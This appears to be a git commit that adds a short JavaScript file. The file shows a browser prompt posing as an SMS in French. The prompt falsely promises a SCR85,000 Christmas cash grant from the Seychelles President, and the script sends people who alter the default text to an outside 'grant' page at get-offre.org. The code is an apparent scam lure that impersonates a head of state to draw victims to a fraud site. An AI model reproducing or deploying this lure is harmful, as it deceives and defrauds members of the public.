9f0f2af6e281898e5e793e00f70533220ddebc5f
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-15 02:52:30 -0800

    Create seychelles-active.js

---
+++ seychelles-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER SCR85,000'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de SCR85,000 du Président WAVEL RAMKALAWAN pour les SEYCHELLOIS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER SCR85,000');
+if (password != 'RETIRER SCR85,000') {
+location.href='https://get-offre.org/seychelles-grant.html';
+}
